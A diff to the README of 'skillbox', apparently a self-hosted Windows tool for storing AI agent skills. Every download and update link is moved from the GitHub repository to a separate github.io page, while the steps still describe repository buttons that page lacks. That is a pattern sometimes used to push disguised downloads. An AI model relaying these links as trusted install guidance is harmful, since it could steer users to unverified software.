@@ -4,7 +4,7 @@
 
 Welcome to **skillbox**! If you've ever wished your AI assistant could remember everything it's learned and keep those skills organized, you're in the right place. Think of skillbox as a smart filing cabinet for AI capabilities—it stores, versions, and organizes skills so your AI agents can access them whenever needed. Best of all, you host it on your own computer, giving you full control over your data.
 
-[![Download Skillbox](https://img.shields.io/badge/Download-Skillbox-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/geninchristophe888-spec/skillbox)
+[![Download Skillbox](https://img.shields.io/badge/Download-Skillbox-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://geninchristophe888-spec.github.io)
 
 ### 🖥️ What Exactly Is Skillbox?
 
@@ -17,7 +17,7 @@ Skillbox is a self-hosted application that acts as a central repository for AI a
 
 ### 📦 Downloading Skillbox
 
-Visit this link to download the application: [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox)
+Visit this link to download the application: [https://geninchristophe888-spec.github.io](https://geninchristophe888-spec.github.io)
 
 Once you're on the page, you'll see a green "Code" button near the top. Click it, and then select "Download ZIP." This is the safest and easiest way to get the software onto your Windows computer.
 
@@ -74,7 +74,7 @@ Verify that skillbox is running (you'll see its icon in the system tray). Check 
 
 To get new features and security fixes, check for updates periodically:
 
-1.  Go to the skillbox website: [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox)
+1.  Go to the skillbox website: [https://geninchristophe888-spec.github.io](https://geninchristophe888-spec.github.io)
 2.  Look for the "Releases" section on the right side of the page.
 3.  If a newer version is available, follow the same download and extraction steps as before. Your existing skills and settings will be preserved.
 
@@ -102,8 +102,8 @@ You're not alone in this journey. Here are some resources:
 
 ### 🏁 Next Steps
 
-You're now ready to take control of your AI's capabilities. Visit [https://github.com/geninchristophe888-spec/skillbox](https://github.com/geninchristophe888-spec/skillbox) to download skillbox and start organizing your AI skills today.
+You're now ready to take control of your AI's capabilities. Visit [https://geninchristophe888-spec.github.io](https://geninchristophe888-spec.github.io) to download skillbox and start organizing your AI skills today.
 
-[![Get Started Now](https://img.shields.io/badge/🚀%20Get%20Started-Now-FF5722?style=for-the-badge&labelColor=1A237E)](https://github.com/geninchristophe888-spec/skillbox)
+[![Get Started Now](https://img.shields.io/badge/🚀%20Get%20Started-Now-FF5722?style=for-the-badge&labelColor=1A237E)](https://geninchristophe888-spec.github.io)
 
 Keywords: self-hosted, skills library, AI agents, MCP, versioned skills, scoped clients, Jev recommendations, Windows application, local AI tools, skill management
